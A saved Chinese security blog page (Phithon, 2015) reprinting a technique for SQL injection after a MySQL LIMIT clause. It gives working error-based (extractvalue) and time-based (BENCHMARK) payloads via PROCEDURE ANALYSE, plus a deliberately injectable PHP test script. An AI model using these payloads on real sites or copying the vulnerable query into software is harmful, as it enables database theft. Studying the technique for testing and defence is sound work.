@@ -1,0 +1,331 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>[转载]Mysql下Limit注入方法 | 离别歌</title>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/styles.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/style.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./[转载]Mysql下Limit注入方法  离别歌/jquery.min.js"></script>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/code.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/button.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./[转载]Mysql下Limit注入方法  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;text=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;title=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;is_video=false&amp;description=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;title=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;title=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;title=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;title=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html&amp;name=%5B%E8%BD%AC%E8%BD%BD%5DMysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">[转载]Mysql下Limit注入方法</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年1月24日 14:29" itemprop="datePublished">
+                    2015 一月 24 14:29
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6132
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/limit%E6%B3%A8%E5%85%A5">limit注入</a>,
+                
+                <a class="tag-link" href="/tag/Mysql">Mysql</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>很长一段时间我、以及很多同学认为“mysql limit后的注入点”是没办法解决的难题，但这次真的被解决了。我很少转载文章，这次再破个例。</p>
+<p>原文： <a href="https://rateip.com/blog/sql-injections-in-mysql-limit-clause/"><a href="https://rateip.com/blog/sql-injections-in-mysql-limit-clause/">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</a></a> <a href="http://zone.wooyun.org/content/18220"><a href="http://zone.wooyun.org/content/18220">http://zone.wooyun.org/content/18220</a></a></p>
+<p>此方法适用于MySQL 5.x中，在limit语句后面的注入 </p>
+<p>例如： </p>
+<div class="codehilite"><pre><span></span><span class="n">SELECT</span> <span class="n">field</span> <span class="n">FROM</span> <span class="n">table</span> <span class="n">WHERE</span> <span class="kt">id</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="kt">id</span> <span class="n">LIMIT</span> <span class="n">injection_point</span>
+<span class="err">```</span>   <span class="err">上面的语句包含了</span><span class="n">ORDER</span> <span class="n">BY</span><span class="err">，</span><span class="n">MySQL当中UNION语句不能在ORDER</span> <span class="n">BY的后面</span><span class="err">，否则利用</span><span class="n">UNION很容易就可以读取数据了</span><span class="err">，看看在</span><span class="n">MySQL</span> <span class="mi">5</span><span class="err">中的</span><span class="n">SELECT语法</span><span class="err">：</span> <span class="err">```</span>
+<span class="n">SELECT</span> 
+    <span class="p">[</span><span class="n">ALL</span> <span class="o">|</span> <span class="n">DISTINCT</span> <span class="o">|</span> <span class="n">DISTINCTROW</span> <span class="p">]</span> 
+      <span class="p">[</span><span class="n">HIGH_PRIORITY</span><span class="p">]</span> 
+      <span class="p">[</span><span class="n">STRAIGHT_JOIN</span><span class="p">]</span> 
+      <span class="p">[</span><span class="n">SQL_SMALL_RESULT</span><span class="p">]</span> <span class="p">[</span><span class="n">SQL_BIG_RESULT</span><span class="p">]</span> <span class="p">[</span><span class="n">SQL_BUFFER_RESULT</span><span class="p">]</span> 
+      <span class="p">[</span><span class="n">SQL_CACHE</span> <span class="o">|</span> <span class="n">SQL_NO_CACHE</span><span class="p">]</span> <span class="p">[</span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="p">]</span> 
+    <span class="n">select_expr</span> <span class="p">[,</span> <span class="n">select_expr</span> <span class="p">...]</span> 
+    <span class="p">[</span><span class="n">FROM</span> <span class="n">table_references</span> 
+    <span class="p">[</span><span class="n">WHERE</span> <span class="n">where_condition</span><span class="p">]</span> 
+    <span class="p">[</span><span class="n">GROUP</span> <span class="n">BY</span> <span class="p">{</span><span class="n">col_name</span> <span class="o">|</span> <span class="n">expr</span> <span class="o">|</span> <span class="n">position</span><span class="p">}</span> 
+      <span class="p">[</span><span class="n">ASC</span> <span class="o">|</span> <span class="n">DESC</span><span class="p">],</span> <span class="p">...</span> <span class="p">[</span><span class="n">WITH</span> <span class="n">ROLLUP</span><span class="p">]]</span> 
+    <span class="p">[</span><span class="n">HAVING</span> <span class="n">where_condition</span><span class="p">]</span> 
+    <span class="p">[</span><span class="n">ORDER</span> <span class="n">BY</span> <span class="p">{</span><span class="n">col_name</span> <span class="o">|</span> <span class="n">expr</span> <span class="o">|</span> <span class="n">position</span><span class="p">}</span> 
+      <span class="p">[</span><span class="n">ASC</span> <span class="o">|</span> <span class="n">DESC</span><span class="p">],</span> <span class="p">...]</span> 
+    <span class="p">[</span><span class="n">LIMIT</span> <span class="p">{[</span><span class="n">offset</span><span class="p">,]</span> <span class="n">row_count</span> <span class="o">|</span> <span class="n">row_count</span> <span class="n">OFFSET</span> <span class="n">offset</span><span class="p">}]</span> 
+    <span class="p">[</span><span class="n">PROCEDURE</span> <span class="n">procedure_name</span><span class="p">(</span><span class="n">argument_list</span><span class="p">)]</span> 
+    <span class="p">[</span><span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="err">'</span><span class="n">file_name</span><span class="err">'</span> <span class="n">export_options</span> 
+      <span class="o">|</span> <span class="n">INTO</span> <span class="n">DUMPFILE</span> <span class="err">'</span><span class="n">file_name</span><span class="err">'</span> 
+      <span class="o">|</span> <span class="n">INTO</span> <span class="n">var_name</span> <span class="p">[,</span> <span class="n">var_name</span><span class="p">]]</span> 
+    <span class="p">[</span><span class="n">FOR</span> <span class="n">UPDATE</span> <span class="o">|</span> <span class="n">LOCK</span> <span class="n">IN</span> <span class="n">SHARE</span> <span class="n">MODE</span><span class="p">]]</span>
+</pre></div>
+<p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用PROCEDURE函数能否注入呢？ Let’s give it a try: </p>
+<div class="codehilite"><pre><span></span>mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); 
+
+ERROR 1386 (HY000): Can't use ORDER clause with this procedure
+</pre></div>
+<p>ANALYSE可以有两个参数：</p>
+<div class="codehilite"><pre><span></span>mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); 
+
+ERROR 1386 (HY000): Can't use ORDER clause with this procedure
+</pre></div>
+<p>看起来并不是很好，继续尝试：</p>
+<div class="codehilite"><pre><span></span>mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);
+</pre></div>
+<p>但是立即返回了一个错误信息： </p>
+<div class="codehilite"><pre><span></span>ERROR 1108 (HY000): Incorrect parameters to procedure 'analyse'
+</pre></div>
+<p>sleep函数肯定没有执行，但是最终我还是找到了可以攻击的方式： </p>
+<div class="codehilite"><pre><span></span>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
+</pre></div>
+<p>如果不支持报错注入的话，还可以基于时间注入：</p>
+<div class="codehilite"><pre><span></span>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+</pre></div>
+<p>直接使用sleep不行，需要用BENCHMARK代替。 </p>
+<p>我亲测好用~这里附上我的测试代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain; charset=utf-8"</span><span class="p">);</span>
+<span class="k">require</span><span class="p">(</span><span class="s2">"mysql.class.php"</span><span class="p">);</span>
+<span class="nv">$mysql</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MySQL</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span> <span class="s2">"root"</span><span class="p">,</span> <span class="s2">"root"</span><span class="p">);</span>
+
+<span class="nv">$users</span> <span class="o">=</span> <span class="nv">$mysql</span><span class="o">-&gt;</span><span class="na">executeSQL</span><span class="p">(</span><span class="s2">"SELECT * FROM user where uid &lt; 100 ORDER BY uid limit </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">]</span><span class="si">}</span><span class="s2">, 10"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$users</span><span class="p">){</span>
+<span class="nv">$users</span> <span class="o">=</span> <span class="nb">var_export</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$users</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="nv">$mysql</span><span class="o">-&gt;</span><span class="na">lastError</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>报错注入获得root密码：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/f6c31422082184.png"><img alt="QQ20150124-4@2x.png" src="./[转载]Mysql下Limit注入方法  离别歌/thum-f6c31422082184.png"/></a></p>
+<p>报错注入获得mysql用户：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201501/23e71422082183.png"><img alt="QQ20150124-3@2x.png" src="./[转载]Mysql下Limit注入方法  离别歌/thum-23e71422082183.png"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2408">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/18d934e3f61c87a49f1d06d2ba8916ce.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.35mt.cn/" target="_blank">创业故事网</a>
+<time datetime="2016年8月17日 10:56" itemprop="datePublished">
+                            2016 八月 17 10:56
+                        </time>
+<a href="javascript:reply_to('2408', '创业故事网')">回复</a>
+</p>
+<p class="comment-meta">学习了，谢谢</p>
+</div>
+</div>
+<div class="row" id="comment-2380">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/9a717c7a82c5d39d17c1dc231848eb37.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">无敌情痴</a>
+<time datetime="2016年7月14日 18:23" itemprop="datePublished">
+                            2016 七月 14 18:23
+                        </time>
+<a href="javascript:reply_to('2380', '无敌情痴')">回复</a>
+</p>
+<p class="comment-meta">好文，小菜鸟我学习了</p>
+</div>
+</div>
+<div class="row" id="comment-1945">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">渣渣</a>
+<time datetime="2015年2月26日 23:15" itemprop="datePublished">
+                            2015 二月 26 23:15
+                        </time>
+<a href="javascript:reply_to('1945', '渣渣')">回复</a>
+</p>
+<p class="comment-meta">渣渣膜拜大牛，先马</p>
+</div>
+</div>
+<div class="row" id="comment-1934">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">Nessus</a>
+<time datetime="2015年2月15日 11:51" itemprop="datePublished">
+                            2015 二月 15 11:51
+                        </time>
+<a href="javascript:reply_to('1934', 'Nessus')">回复</a>
+</p>
+<p class="comment-meta">mysql 5.6 以上不能用了？</p>
+</div>
+</div>
+<div class="row" id="comment-1924">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/fd1af5affc8b96c492b54c1831b589a0.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">威客资讯</a>
+<time datetime="2015年1月26日 15:48" itemprop="datePublished">
+                            2015 一月 26 15:48
+                        </time>
+<a href="javascript:reply_to('1924', '威客资讯')">回复</a>
+</p>
+<p class="comment-meta">全都是代码啊。。。。。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1926">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./[转载]Mysql下Limit注入方法  离别歌/0488177ea3ddf12631607e5cb5dd05da.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.m4ster.net" target="_blank">M4ster</a>
+<time datetime="2015年1月27日 10:12" itemprop="datePublished">
+                            2015 一月 27 10:12
+                        </time>
+<a href="javascript:reply_to('1926', 'M4ster')">回复</a>
+</p>
+<p class="comment-meta">@威客资讯：SQL语句，不是查询命令还能是什么？</p>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="ec3940e8bf52b8d33ce33ab0b32c56119d01d267"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./[转载]Mysql下Limit注入方法  离别歌/ec3940e8bf52b8d33ce33ab0b32c56119d01d267"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="327">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="Qn4wtHtVT6CDbJxDA561vzpcWqWvwEAZoHp2hbFakTw2boVSomAL4drh5upDf8p9"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./[转载]Mysql下Limit注入方法  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./[转载]Mysql下Limit注入方法  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
